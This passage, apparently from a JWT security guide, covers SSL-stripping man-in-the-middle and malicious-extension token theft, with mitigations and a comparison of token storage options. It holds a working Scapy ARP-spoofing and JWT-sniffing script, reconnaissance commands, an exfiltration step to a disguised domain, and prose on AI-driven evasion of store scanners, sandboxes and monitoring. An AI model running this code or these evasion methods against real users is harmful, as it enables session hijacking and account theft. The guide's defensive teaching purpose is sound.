    Note over A: Attacker controls Wi-Fi network
    
    V->>A: Connect to malicious Wi-Fi
    A->>V: Connection established
    
    V->>A: HTTP request to portal (initial)
    Note over V,A: http://portal.company.com
    A->>WS: Forward request as HTTPS
    Note over A,WS: https://portal.company.com
    
    WS->>A: HTTPS response (redirect to HTTPS)
    A->>V: Deliver as HTTP (strip SSL)
    Note over A,V: SSL Stripping - remove HTTPS redirect
    
    V->>V: User enters credentials
    V->>A: POST login credentials (HTTP)
    Note over V: ⚠ User doesnt notice missing lock icon
    
    A->>A: Capture credentials and requests
    A->>WS: Forward login (HTTPS)
    
    WS->>A: Return JWT token in response
    Note over WS,A: Set-Cookie: jwt=eyJhbG... with Secure flag
    A->>A: Log captured JWT token
    
    A->>V: Forward response (HTTP, remove Secure flag)
    Note over A,V: Set-Cookie: jwt=eyJhbG... without Secure
    
    V->>A: Subsequent API requests with token (HTTP)
    Note over V,A: Cookie: jwt=eyJhbG...
    A->>A: Capture token in all requests
    A->>WS: Forward requests (HTTPS)
    
    WS->>A: API responses
    A->>V: Forward responses
    
    Note over A: Attacker now has valid JWT
    
    A->>API: Use stolen token from attackers device
    Note over A,API: Authorization: Bearer eyJhbG...<br/>from HTTPS connection
    API->>A: Grant access to victims account
    
    A->>API: Extract sensitive data
    API->>A: Return confidential information
```

#### Attack simulation code

**Reconnaissance (Information Gathering):**

For Man-in-the-Middle attacks targeting JWT tokens, the primary reconnaissance tools are **Nmap** for network discovery and **Wireshark** for traffic analysis. Nmap is a powerful network scanning tool that can identify active hosts, open ports, and running services on a network, essential for positioning an attack. Wireshark is a network protocol analyzer that allows deep inspection of network traffic, enabling attackers to identify unencrypted token transmissions. Additionally, **Bettercap** is an all-in-one tool for network attacks that includes ARP spoofing, DNS spoofing, and SSL stripping capabilities in a single framework.

**Reconnaissance Steps:**
1. Use `nmap -sn 192.168.1.0/24` to discover active hosts on the local network
2. Use `nmap -sV -p 80,443,8080 <target>` to identify web services
3. Launch Wireshark to capture network traffic on the interface
4. Filter for HTTP traffic using `http` filter to identify unencrypted sessions
5. Look for `Authorization: Bearer` or `Set-Cookie` patterns in captured packets
6. Use Bettercap's `net.probe on` to discover devices and `net.show` to list them
7. Analyze captured traffic for HTTPS without proper HSTS implementation

**Weaponization Python Script:**

```python
#!/usr/bin/env python3
"""
Man-in-the-Middle Attack Simulation Script for JWT Token Interception
WARNING: For educational and authorized testing purposes only.
Uses Scapy for packet manipulation - requires root/admin privileges.
"""

from scapy.all import *
from scapy.layers.http import HTTPRequest, HTTPResponse
import threading
import argparse
import logging
import re
import time

# Configure logging for visibility
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Store captured tokens
captured_tokens = []


def get_mac(ip: str) -> str:
    """
    Get the MAC address for a given IP using ARP request.
    Essential for ARP spoofing to work correctly.
    """
    # Create ARP request packet
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    # Send packet and get response
    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    
    if answered_list:
        return answered_list[0][1].hwsrc
    return None


def spoof_arp(target_ip: str, spoof_ip: str, target_mac: str):
    """
    Send spoofed ARP response to target, telling it that we are the gateway.
    This redirects traffic through our machine.
    """
    # Create ARP response (op=2) that lies about our MAC
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    send(packet, verbose=False)


def restore_arp(target_ip: str, gateway_ip: str, target_mac: str, gateway_mac: str):
    """
    Restore the original ARP tables after attack.
    Important for stealth and network stability.
    """
    # Send correct ARP to restore normal network operation
    packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, 
                 psrc=gateway_ip, hwsrc=gateway_mac)
    send(packet, count=4, verbose=False)


def extract_jwt_from_packet(packet) -> list:
    """
    Extract JWT tokens from HTTP packets.
    Looks in Authorization headers and cookies.
    """
    tokens = []
    
    try:
        if packet.haslayer(HTTPRequest):
            # Extract HTTP layer data
            http_layer = packet.getlayer(HTTPRequest)
            
            # Check for Authorization header
            if hasattr(http_layer, 'Authorization'):
                auth_header = http_layer.Authorization.decode() if http_layer.Authorization else ""
                if auth_header.startswith('Bearer '):
                    token = auth_header[7:]  # Remove 'Bearer ' prefix
                    if is_valid_jwt(token):
                        tokens.append({
                            'type': 'Authorization Header',
                            'token': token,
                            'host': http_layer.Host.decode() if http_layer.Host else 'Unknown'
                        })
            
            # Check for Cookie header
            if hasattr(http_layer, 'Cookie'):
                cookie_header = http_layer.Cookie.decode() if http_layer.Cookie else ""
                # Look for JWT patterns in cookies
                jwt_pattern = r'(?:jwt|token|access_token|auth)[=:]([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
                matches = re.findall(jwt_pattern, cookie_header, re.IGNORECASE)
                for match in matches:
                    if is_valid_jwt(match):
                        tokens.append({
                            'type': 'Cookie',
                            'token': match,
                            'host': http_layer.Host.decode() if http_layer.Host else 'Unknown'
                        })
        
        # Also check response for Set-Cookie headers
        if packet.haslayer(HTTPResponse):
            http_response = packet.getlayer(HTTPResponse)
            if hasattr(http_response, 'Set-Cookie'):
                cookie = http_response.Set-Cookie if http_response.Set-Cookie else ""
                # Similar JWT extraction from Set-Cookie
                jwt_pattern = r'([A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+)'
                matches = re.findall(jwt_pattern, str(cookie))
                for match in matches:
                    if is_valid_jwt(match):
                        tokens.append({
                            'type': 'Set-Cookie Response',
                            'token': match,
                            'host': 'Response'
                        })
                        
    except Exception as e:
        logger.debug(f"Error extracting from packet: {e}")
    
    return tokens


def is_valid_jwt(token: str) -> bool:
    """
    Validate that a string looks like a valid JWT.
    JWTs have 3 base64url-encoded parts separated by dots.
    """
    import base64
    
    parts = token.split('.')
    if len(parts) != 3:
        return False
    
    try:
        # Try to decode header and payload (add padding if needed)
        for i in range(2):
            part = parts[i]
            # Add padding for base64 decoding
            padding = 4 - len(part) % 4
            if padding != 4:
                part += '=' * padding
            base64.urlsafe_b64decode(part)
        return True
    except Exception:
        return False


def packet_callback(packet):
    """
    Callback function for sniffed packets.
    Processes each packet looking for JWT tokens.
    """
    global captured_tokens
    
    tokens = extract_jwt_from_packet(packet)
    for token_info in tokens:
        if token_info['token'] not in [t['token'] for t in captured_tokens]:
            captured_tokens.append(token_info)
            logger.warning(f"CAPTURED JWT from {token_info['host']}")
            logger.info(f"Token type: {token_info['type']}")
            logger.info(f"Token (truncated): {token_info['token'][:50]}...")


def run_arp_spoof(target_ip: str, gateway_ip: str, stop_event: threading.Event):
    """
    Continuously send ARP spoof packets to maintain MITM position.
    Runs until stop_event is set.
    """
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        logger.error("Could not get MAC addresses. Check target IPs.")
        return
    
    logger.info(f"Starting ARP spoofing: {target_ip} <-> {gateway_ip}")
    
    try:
        while not stop_event.is_set():
            # Spoof both directions for full MITM
            spoof_arp(target_ip, gateway_ip, target_mac)  # Tell victim we're gateway
            spoof_arp(gateway_ip, target_ip, gateway_mac)  # Tell gateway we're victim
            time.sleep(1)  # Send every second
    except KeyboardInterrupt:
        pass
    finally:
        # Restore ARP tables
        logger.info("Restoring ARP tables...")
        restore_arp(target_ip, gateway_ip, target_mac, gateway_mac)
        restore_arp(gateway_ip, target_ip, gateway_mac, target_mac)


def run_mitm_attack(target_ip: str, gateway_ip: str, interface: str, duration: int):
    """
    Main function to orchestrate the MITM attack.
    Sets up ARP spoofing and packet sniffing.
    """
    logger.info(f"Starting MITM attack simulation")
    logger.info(f"Target: {target_ip}, Gateway: {gateway_ip}")
    logger.info(f"Interface: {interface}, Duration: {duration}s")
    
    # Enable IP forwarding (required for MITM to work)
    logger.info("Note: IP forwarding must be enabled on this system")
    logger.info("Run: echo 1 > /proc/sys/net/ipv4/ip_forward")
    
    # Event to stop threads gracefully
    stop_event = threading.Event()
    
    # Start ARP spoofing in separate thread
    arp_thread = threading.Thread(
        target=run_arp_spoof, 
        args=(target_ip, gateway_ip, stop_event)
    )
    arp_thread.daemon = True
    arp_thread.start()
    
    # Give ARP spoofing time to establish
    time.sleep(2)
    
    # Start packet sniffing
    logger.info("Starting packet capture... Looking for JWT tokens")
    
    try:
        # Sniff HTTP traffic (port 80) - HTTPS would require SSL stripping
        sniff(
            iface=interface,
            filter=f"host {target_ip} and tcp port 80",
            prn=packet_callback,
            timeout=duration,
            store=False
        )
    except Exception as e:
        logger.error(f"Sniffing error: {e}")
    finally:
        stop_event.set()
        arp_thread.join(timeout=5)
    
    # Report captured tokens
    logger.info(f"\n{'='*60}")
    logger.info(f"MITM Attack Simulation Complete")
    logger.info(f"Captured {len(captured_tokens)} JWT token(s)")
    
    for i, token_info in enumerate(captured_tokens, 1):
        logger.info(f"\nToken {i}:")
        logger.info(f"  Type: {token_info['type']}")
        logger.info(f"  Host: {token_info['host']}")
        logger.info(f"  Token: {token_info['token']}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="MITM Attack Simulation for JWT Capture")
    parser.add_argument("--target", required=True, help="Target victim IP address")
    parser.add_argument("--gateway", required=True, help="Gateway/Router IP address")
    parser.add_argument("--interface", default="eth0", help="Network interface to use")
    parser.add_argument("--duration", type=int, default=60, help="Capture duration in seconds")
    args = parser.parse_args()
    
    # Check for root privileges (required for raw sockets)
    import os
    if os.geteuid() != 0:
        logger.error("This script requires root privileges. Run with sudo.")
        exit(1)
    
    run_mitm_attack(args.target, args.gateway, args.interface, args.duration)
```

#### AI-ML-Enhanced Attack Techniques

**1. ML-Optimized Victim Targeting and Network Positioning**

Machine learning models can analyze public WiFi network characteristics to identify optimal attack positions and high-value targets among connected devices without active probing that might trigger alerts. By passively collecting network metadata such as device types, traffic patterns, and connection behaviors, an ML classifier can distinguish between enterprise laptops, personal devices, and IoT equipment to prioritize targets likely to have valuable JWT tokens. The model can be trained on historical data correlating device fingerprints with successful token captures to predict which victims are most likely accessing web applications with authentication tokens. Temporal analysis using LSTM (Long Short-Term Memory) networks can identify patterns in user behavior, such as when users typically authenticate to banking or enterprise applications during coffee shop visits. Location-aware models can correlate physical venues (airports, hotels, conference centers) with the likelihood of encountering high-value business travelers accessing cloud services. The system can dynamically adjust attack parameters based on real-time network conditions, victim behavior, and detection risk assessment. This targeted approach significantly increases the efficiency of MITM attacks by focusing resources on victims most likely to yield valuable authentication tokens. Network graph analysis can also identify relationships between devices, potentially revealing corporate VPN users whose tokens provide access to entire enterprise networks.

**2. Deep Learning for Encrypted Traffic Analysis and Token Detection**

Even when HTTPS is properly implemented, deep learning models can analyze encrypted traffic patterns to identify authentication flows and predict when JWT tokens are being transmitted without decrypting the content. Neural networks trained on TLS traffic metadata—including packet sizes, timing, and flow characteristics—can classify sessions as authentication events with high accuracy based on the unique fingerprint of login sequences. By identifying when users are actively authenticating, attackers can time SSL stripping attempts or certificate spoofing attacks for maximum effectiveness during the brief vulnerability window. Sequence models like transformers can analyze the temporal patterns of encrypted packet exchanges to distinguish between token refresh operations, initial authentication, and regular API calls with existing tokens. The model can detect subtle differences in traffic patterns between applications that store tokens in HttpOnly cookies versus localStorage, informing attack strategy selection. Federated learning across multiple MITM positions allows attackers to build comprehensive models of application authentication patterns without sharing captured data. This intelligence enables attackers to recognize when a victim is about to receive a new access token, making the interception timing more precise. Advanced models can even infer the token lifetime based on refresh patterns, helping attackers prioritize extraction of long-lived tokens.

**3. AI-Driven SSL Stripping and Certificate Manipulation**

Artificial intelligence can automate and optimize SSL stripping attacks by dynamically adapting to target applications' security configurations and learning which techniques successfully evade browser security warnings. Traditional SSL stripping tools use static techniques that modern browsers and applications increasingly detect, but AI-driven approaches can learn from failed attempts and evolve new evasion strategies. The system can analyze target website behavior to determine optimal moments for downgrade attacks, such as during redirects or when loading mixed content that might be less strictly validated. Machine learning models can generate convincing certificate variations that minimize user suspicion when certificate warnings do appear, learning from UI/UX research about which security indicators users are most likely to ignore. Natural language generation can create realistic certificate details that match victim organization naming conventions, increasing the likelihood that users will accept fraudulent certificates. The AI can orchestrate complex multi-step attacks, first compromising DNS resolution to redirect traffic, then presenting strategically crafted certificates optimized for the specific victim. Reinforcement learning allows the system to automatically balance aggression (more effective attacks) with stealth (lower detection probability) based on the observed security posture. By continuously adapting to browser security updates and new certificate validation mechanisms, AI-driven SSL manipulation remains effective against evolving defenses.

**4. Reinforcement Learning for Adaptive Attack Parameter Optimization**

Reinforcement learning agents can dynamically optimize MITM attack parameters in real-time, learning from each interaction to maximize token capture success while minimizing the probability of detection, network disruption, or victim awareness. The RL agent observes network state including traffic patterns, victim behavior, and security tool responses to determine which attack techniques (ARP spoofing rate, packet injection timing, SSL stripping aggressiveness) work best in the current environment. Reward functions can be designed to prioritize high-value tokens (admin accounts, financial applications) over regular user tokens, and to penalize actions that cause network instability alerting IT staff. The agent learns to recognize security monitoring systems (IDS/IPS signatures, network behavior analyzers) and automatically adjusts attack parameters to stay below detection thresholds. Multi-armed bandit algorithms can efficiently explore different attack configurations (timing, targeting, technique selection) to find optimal strategies with minimal failed attempts. The system can learn victim-specific models, recognizing individual behavior patterns and adapting attack timing to each target's authentication habits. Transfer learning allows attack strategies learned in one network environment to be quickly adapted to new targets with different security configurations. This continuous optimization transforms MITM attacks from static, easily-detected operations into adaptive threats that evolve to match defending capability, creating a persistent challenge for network security teams.

#### Mitigation Application

Implementing proper HTTPS enforcement and additional safeguards prevents this MITM attack:

**Step-by-step mitigation:**

1. **HTTPS Everywhere**: Configure server to redirect all HTTP requests to HTTPS at the infrastructure level (load balancer/CDN)

2. **HTTP Strict Transport Security (HSTS)**: Send HSTS header instructing browsers to always use HTTPS, preventing downgrade attacks

3. **HSTS Preloading**: Submit domain to browser HSTS preload lists, ensuring HTTPS enforcement even on first visit

4. **Secure Cookie Flag**: Set Secure flag on all cookies containing tokens, preventing transmission over HTTP

5. **Certificate Validation**: Implement certificate pinning in mobile apps and educate users about certificate warnings

6. **Token Binding**: Bind tokens to TLS channel characteristics, making intercepted tokens unusable

7. **Monitoring**: Detect and alert on connections using HTTP or with certificate validation failures

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker (MITM Proxy)
    participant V as Victim
    participant SS as Secured Server
    participant API as API Server

    Note over A: Attacker controls Wi-Fi network
    
    V->>A: Connect to malicious Wi-Fi
    A->>V: Connection established
    
    V->>A: HTTP request to portal (initial)
    Note over V,A: http://portal.company.com
    
    Note over V: ✓ Browser has HSTS preload entry
    V->>V: Automatically upgrade to HTTPS
    Note over V: Internal upgrade: https://portal.company.com
    
    V->>A: HTTPS request (TLS handshake)
    A->>V: Present fake certificate
    
    V->>V: Validate certificate
    Note over V: ✗ Certificate invalid or not trusted!
    V--xA: Refuse connection
    V->>V: Display security warning
    
    Note over V: User cannot proceed without explicitly bypassing warning
    
    alt If user bypasses warning (backup defenses)
        V->>A: Establish HTTPS with fake cert
        A->>SS: Connect to real server with HTTPS
        
        V->>A: User attempts login
        A->>A: Cannot intercept encrypted content effectively
        A->>SS: Forward login
        
        SS->>A: Return JWT with security headers
        Note over SS,A: Set-Cookie with jwt token<br/>Flags: Secure / HttpOnly / SameSite=Strict<br/>HSTS header with max-age=31536000
        
        Note over A,V: ✓ Even if MITM present:<br/>- Token in HttpOnly cookie<br/>- Secure flag prevents HTTP transmission<br/>- Token bound to TLS channel
    end
    
    alt Legitimate secure connection
        V->>SS: Direct HTTPS connection (HSTS forces it)
        SS->>V: Valid certificate presented
        V->>V: Validate certificate successfully
        V->>SS: TLS handshake complete
        
        V->>SS: Login request (encrypted)
        SS->>V: JWT token with security flags
        Note over SS,V: Flags: Secure / HttpOnly / SameSite / HSTS
        
        V->>SS: Subsequent requests (encrypted)
        Note over V,SS: Token transmitted over TLS only
        SS->>V: Responses
    end
    
    Note over V,API: Defense in depth:<br/>1. HSTS preload prevents HTTP connections<br/>2. Certificate validation prevents MITM<br/>3. Secure flag prevents HTTP token transmission<br/>4. TLS encryption protects token in transit<br/>5. Token binding to TLS channel<br/>6. User education about security warnings
```

---

### Scenario 4: Token Theft via Browser Extension Malware

#### Attack Flow

An attacker distributes a malicious browser extension disguised as a productivity tool. Once installed, the extension uses its permissions to extract JWT tokens from any website the user visits.

**Step-by-step attack process:**

1. **Malicious Extension Creation**: The attacker creates a browser extension with legitimate-appearing functionality (ad blocker, password manager, productivity tool) but includes hidden malicious code

2. **Distribution**: The extension is distributed through official browser extension stores with fake reviews, social media promotion, or bundled with other software

3. **Installation**: Users install the extension, granting it broad permissions including "access to all websites" and "storage access"

4. **Activation**: Once installed, the extension runs on every web page the user visits, with full access to the DOM and browser APIs

5. **Token Discovery**: The extension's background script monitors and accesses localStorage, sessionStorage, and non-HttpOnly cookies across all sites

6. **Continuous Monitoring**: The extension watches for authentication events and captures tokens as they're stored

7. **Data Exfiltration**: Captured tokens are periodically sent to attacker-controlled servers, often encrypted or obfuscated to avoid detection

8. **Mass Exploitation**: The attacker accumulates tokens from multiple services (banking, email, social media, work accounts) for each victim

**Attack diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant ES as Extension Store
    participant V as Victim Browser
    participant ME as Malicious Extension
    participant WS as Web Server
    participant AS as Attacker Server
    participant API as API Server

    A->>ES: Upload productivity tool extension
    Note over A,ES: Extension requests broad permissions
    ES->>ES: Automated review (passes)
    
    V->>ES: Search for productivity tools
    ES->>V: Show malicious extension with fake reviews
    V->>ES: Install extension
    
    ES->>V: Prompt for permissions
    Note over V: Permissions: Access to all websites<br/>Read and modify storage
    V->>V: User grants permissions
    ES->>V: Install malicious extension
    
    V->>ME: Extension activated
    ME->>ME: Register content scripts for all sites
    ME->>ME: Start background monitoring
    
    V->>WS: User logs into banking site
    WS->>V: Authentication successful
    WS->>V: Store JWT in localStorage
    Note over V: localStorage.setItem auth_token = eyJhbG...
    
    ME->>V: Content script monitors storage events
    ME->>ME: Detect new token stored
    ME->>V: Access localStorage.getItem auth_token
    ME->>ME: Capture JWT token
    
    ME->>AS: Exfiltrate token to attacker server
    Note over ME,AS: POST analytics-cdn.com/metrics<br/>body includes userId and token
    
    AS->>A: Attacker receives token
    
    Note over A: Repeat for all sites user visits
    
    A->>API: Use stolen banking token
    Note over A,API: Authorization: Bearer eyJhbG...
    API->>A: Grant access to victims banking
    
    A->>API: Initiate fraudulent transactions
    API->>A: Transactions successful
```

#### AI-ML-Enhanced Attack Techniques

**1. LLM-Generated Convincing Extension Descriptions and Fake Reviews**

Large Language Models can generate highly convincing extension descriptions, feature lists, and fake user reviews that make malicious extensions appear legitimate and trustworthy, dramatically increasing installation rates. By analyzing the writing style and content patterns of top-rated legitimate extensions, the LLM can produce descriptions that match user expectations for quality productivity tools. The model can generate hundreds of unique fake reviews with varying ratings (mostly 5-star with some realistic 4-star reviews), each with distinct writing styles, complaint patterns, and feature mentions that appear authentic. Review generation can incorporate temporal patterns, spreading fake reviews over time to avoid detection of suspicious review bombing behavior. The LLM can also generate responses to user questions and negative reviews that demonstrate apparent developer engagement and support. By analyzing successful extension marketing copy, the AI can identify psychological triggers and trust signals that increase user willingness to grant broad permissions. The model can adapt messaging for different target audiences—generating business-focused copy for enterprise productivity tools or casual language for consumer utilities. This AI-generated social proof creates a veneer of legitimacy that helps malicious extensions pass both automated review systems and user scrutiny.

**2. ML-Based Evasion of Extension Store Security Scanning**

Machine learning techniques can be employed to systematically evade the automated security scanning systems used by Chrome Web Store, Firefox Add-ons, and other extension marketplaces. These marketplaces use ML-based classifiers to detect malicious behavior patterns in extension code, but attackers can train surrogate models to understand and evade these detection mechanisms. By submitting test extensions with varying code patterns and observing acceptance/rejection decisions, attackers can reverse-engineer the features used by marketplace detectors. Adversarial perturbation techniques can then modify malicious code to shift its feature representation away from detected malware clusters while preserving functionality. The attacker can use code splitting strategies, delaying malicious behavior until after initial review periods when extensions are most closely monitored. Oblivious transfer and time-delayed execution patterns can hide token theft code that only activates after the extension has been installed for a certain period or has reached a threshold number of users. ML models can learn which code structures trigger manual review and automatically restructure malicious functionality to avoid these patterns. This adversarial arms race requires marketplace operators to continuously update their detection models, providing windows of opportunity for sophisticated attackers.

**3. AI-Optimized Data Exfiltration Timing and Covert Channel Selection**

Artificial intelligence can optimize the timing and method of token exfiltration to evade detection by security monitoring tools and browser protections, maximizing stealth while ensuring reliable data delivery. The AI system can analyze network traffic patterns to identify optimal moments for exfiltration when malicious requests will blend with legitimate traffic. By learning user browsing behavior, the system can predict periods of high activity when additional network requests are less likely to be noticed in monitoring tools. The AI can dynamically select from multiple covert channels (image beacons, WebSocket connections, DNS tunneling, timing-based channels) based on the target environment's security controls. Machine learning models can detect the presence of security extensions, network monitoring tools, or corporate proxies and automatically adjust exfiltration strategies to evade these defenses. The system can implement adaptive rate limiting, spacing exfiltration attempts to stay below anomaly detection thresholds used by security information and event management (SIEM) systems. By analyzing CSP headers and other security configurations on each page, the AI selects exfiltration methods that are permitted by the target's security policy. This intelligent approach to covert data transfer significantly extends the lifetime of malicious extensions before detection and removal.

**4. Deep Learning for Behavioral Mimicry and Detection Evasion**

Deep learning models can analyze legitimate extension behavior patterns and generate malicious extensions that perfectly mimic these patterns, making behavioral analysis-based detection extremely difficult. By training on telemetry data from popular legitimate extensions (API access patterns, timing, resource usage), the AI learns what "normal" extension behavior looks like to security monitoring systems. The malicious extension can then schedule its activities (storage access, network requests) to statistically match the behavior of legitimate productivity tools. Generative models can produce extension UI interactions and permission request flows that feel natural and expected to users, reducing suspicion when broad permissions are requested. The AI can analyze browser forensic investigation techniques and ensure that malicious activity leaves minimal traces detectable by incident response teams. Deep reinforcement learning enables the extension to adapt its behavior in real-time based on signals that might indicate investigation or monitoring, such as developer tools opening or unusual network latency suggesting traffic inspection. The model can learn to distinguish between real users and automated security testing environments, behaving legitimately in sandboxes while activating malicious functionality only for genuine victims. This sophisticated behavioral camouflage represents a significant evolution in extension-based threats, requiring defenders to develop equally sophisticated behavioral analysis systems that can detect subtle anomalies across millions of extension installations.

#### Mitigation Application

Implementing defenses that limit extension capabilities and token accessibility prevents this attack:

**Step-by-step mitigation:**

1. **HttpOnly Cookie Storage**: Store all JWT tokens in HttpOnly cookies that browser extensions cannot access through JavaScript APIs

2. **Extension Security Policies**: Modern browsers can restrict extension access to sensitive cookies through manifest v3 and security policies

3. **Token Encryption**: For tokens that must be in accessible storage, encrypt them with keys not accessible to extensions

4. **Minimal Token Lifetime**: Very short-lived tokens limit the window of vulnerability even if extensions capture them

5. **Behavioral Detection**: Monitor for tokens being used from unusual contexts or simultaneously from multiple locations

6. **User Education**: Train users to review extension permissions carefully and install only trusted extensions

7. **Allowlisting**: In enterprise environments, use policies to allow only pre-approved extensions

**Mitigation diagram:**

```mermaid
sequenceDiagram
    participant A as Attacker
    participant ES as Extension Store
    participant V as Victim Browser
    participant ME as Malicious Extension
    participant SS as Secured Server
    participant API as API Server
    participant MON as Monitoring System

    A->>ES: Upload productivity tool extension
    ES->>ES: Review process
    
    V->>ES: Install extension
    ES->>V: Prompt for permissions
    Note over V: Permissions: Access to all websites<br/>Read and modify storage
    V->>V: User grants permissions
    ES->>V: Install malicious extension
    
    V->>ME: Extension activated
    ME->>ME: Register content scripts
    
    V->>SS: User logs into banking site
    SS->>V: Authentication successful
    
    SS->>V: Store JWT in HttpOnly cookie
    Note over SS,V: Set-Cookie: auth_token=eyJhbG...<br/>Flags: HttpOnly / Secure / SameSite=Strict
    Note over V: ✓ Token stored in HTTP-only cookie
    
    ME->>V: Content script monitors storage
    ME->>V: Attempt to access localStorage
    Note over ME,V: ✓ No token in localStorage
    
    ME->>V: Attempt to access document.cookie
    V->>ME: Return empty (HttpOnly cookies not accessible)
    Note over ME,V: ✓ HttpOnly cookie not readable by JavaScript
    
    ME->>V: Attempt to intercept network requests
    V->>SS: API request with cookie (automatic)
    Note over V,SS: Cookie automatically attached by browser
    Note over ME,V: ✓ Extension can see requests but not extract HttpOnly cookie value
    
    ME--xME: No token captured
    
    Note over V: Token used for 15 minutes only (short-lived)
    
    V->>SS: Multiple API requests with token
    SS->>API: Process authenticated requests
    API->>MON: Log authentication events
    
    MON->>MON: Analyze access patterns
    Note over MON: ✓ Monitor for:<br/>- Unusual access times<br/>- New device fingerprints<br/>- Geographic anomalies<br/>- Concurrent sessions
    
    alt If token somehow stolen (backup detection)
        A->>API: Attempt to use token from different context
        API->>API: Validate token
        API->>API: Check token binding (User-Agent and IP)
        API->>MON: Log authentication attempt
        
        MON->>MON: Detect anomaly
        Note over MON: ✗ Token used from suspicious context
        MON->>API: Trigger security alert
        API->>API: Invalidate refresh token
        API->>V: Require re-authentication
    end
    
    Note over V,API: Defense in depth:<br/>1. HttpOnly prevents extension access<br/>2. Short token lifetime limits exposure<br/>3. Token binding restricts usage<br/>4. Behavioral monitoring detects anomalies<br/>5. Rapid token rotation limits impact<br/>6. User education reduces risk
    
    Note over V: Enterprise policies (additional layer)
    Note over V: ✓ Only approved extensions allowed<br/>✓ Extension permissions regularly audited<br/>✓ Security training for users
```

---

## Token Storage and Expiration Management

This section provides comprehensive details on how JWT tokens are stored, how expiration is checked, and what happens when tokens expire.

### Token Storage Locations

After the server generates the JWT Access Token, it's sent to the browser and stored on the client. The storage location significantly impacts security and vulnerability to theft.

#### Storage Options (Most to Least Secure)

**1. HttpOnly Cookies (Most Secure - Recommended)**

```
Server Response:
Set-Cookie: access_token=eyJhbG...; HttpOnly; Secure; SameSite=Strict; Path=/

Browser: Automatically stores in cookie jar
Location: Browser's cookie storage (not accessible to JavaScript)
```

**Pros:**
- Not accessible to JavaScript (XSS protection)
- Automatically sent with requests
- Protected from browser extensions
- Secure flag prevents HTTP transmission

**Cons:**
- Requires CSRF protection
- Slightly more complex CORS setup
- May complicate cross-domain authentication flows

**2. In-Memory (JavaScript Variables)**

```javascript
// Stored in JavaScript variable
let accessToken = "eyJhbG...";

// Lost when:
// - Page refreshes
// - Tab closes
// - Browser closes
```

**Pros:**
- Not persisted to disk
- Cleared automatically on refresh/close
- No persistent storage attack surface

**Cons:**
- Lost on page refresh (poor UX)
- Still vulnerable to XSS during active session
- Doesn't work for multi-tab applications
- Requires re-authentication on every page load

**3. Session Storage**

```javascript
// Stored in browser's session storage
sessionStorage.setItem('access_token', 'eyJhbG...');

// Persists: Only for the browser tab session
// Cleared: When tab/window closes
```

**Pros:**
- Cleared when tab closes
- Scoped to single tab (isolation)
- Better UX than in-memory (survives page refresh)

**Cons:**
- Accessible to JavaScript (XSS risk)
- Accessible to browser extensions
- Not shared across tabs
- Still vulnerable to XSS attacks

**4. Local Storage (Least Secure - Not Recommended)**

```javascript
// Stored in browser's local storage
localStorage.setItem('access_token', 'eyJhbG...');

// Persists: Until explicitly cleared
// Survives: Browser restarts, tab closes
```

**Pros:**
- Persists across sessions
- Simple to use
- Shared across tabs
- Good UX (no re-authentication)

**Cons:**
- Accessible to JavaScript (XSS risk)
- Accessible to browser extensions
- Persists indefinitely
- Highest risk for token theft

#### Storage Comparison Table

| Storage Method | XSS Risk | Extension Risk | MITM Risk | CSRF Risk | Persistence | UX Impact |
|---------------|----------|----------------|-----------|-----------|-------------|-----------|
| **HttpOnly Cookie** | ✅ Protected | ✅ Protected | ⚠️ If not HTTPS | ⚠️ Needs CSRF token | Session-based | Excellent |
| **In-Memory** | ❌ Vulnerable | ❌ Vulnerable | ⚠️ If not HTTPS | ✅ N/A | None | Poor |
| **Session Storage** | ❌ Vulnerable | ❌ Vulnerable | ⚠️ If not HTTPS | ✅ N/A | Tab session | Good |
| **Local Storage** | ❌ Vulnerable | ❌ Vulnerable | ⚠️ If not HTTPS | ✅ N/A | Indefinite | Excellent |

#### How Token Storage Works in Practice

**Server sends token:**

```http
HTTP/1.1 200 OK
Set-Cookie: access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Strict
Content-Type: application/json

{
  "access_token": "eyJhbG...",  // If not using cookie
  "refresh_token": "...",        // Always in HttpOnly cookie
  "expires_in": 900              // 15 minutes
}
```

**Browser stores it:**
- If in cookie: Browser's cookie jar (automatic)
- If in response body: JavaScript code stores it in chosen location

**Browser uses it:**

```javascript
// If stored in cookie (HttpOnly):
// Browser automatically includes in requests:
// Cookie: access_token=eyJhbG...

// If stored in localStorage/sessionStorage:
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${localStorage.getItem('access_token')}`
  }
})
```

### Expiration Checking Process

Understanding how the system checks token expiration is crucial for security and understanding token lifecycle.

#### Access Token Expiration Check

Access tokens are JWTs with an `exp` (expiration) claim. The server checks expiration during validation:

**Step-by-Step Process:**

1. **Extract and Decode the Token**
   ```javascript
   // Server receives request
   const token = req.headers.authorization.split(' ')[1]; // "Bearer eyJhbG..."
   
   // Split the token into parts
   const [headerB64, payloadB64, signature] = token.split('.');
   
   // Base64URL decode the payload
   const payload = JSON.parse(base64UrlDecode(payloadB64));
   ```

2. **Read the Expiration Claim**
   ```javascript
   // Payload contains:
   {
     "sub": "1234567890",
     "name": "John",
     "iat": 1699990000,  // Issued at (Unix timestamp)
     "exp": 1700000000,  // Expiration (Unix timestamp)
     "iss": "auth.example.com"
   }
   ```

3. **Compare with Current Time**
   ```javascript
   const currentTime = Math.floor(Date.now() / 1000); // Current Unix timestamp
   const expirationTime = payload.exp;
   
   if (currentTime >= expirationTime) {
     // Token is expired
     return res.status(401).json({ error: 'Token expired' });
   }
   
   // Token is still valid
   // Continue with request processing
   ```

**Complete Validation Flow:**

```javascript
function validateAccessToken(token) {
  try {
    // 1. Split token into parts
    const parts = token.split('.');
    if (parts.length !== 3) {
      throw new Error('Invalid token format');
    }

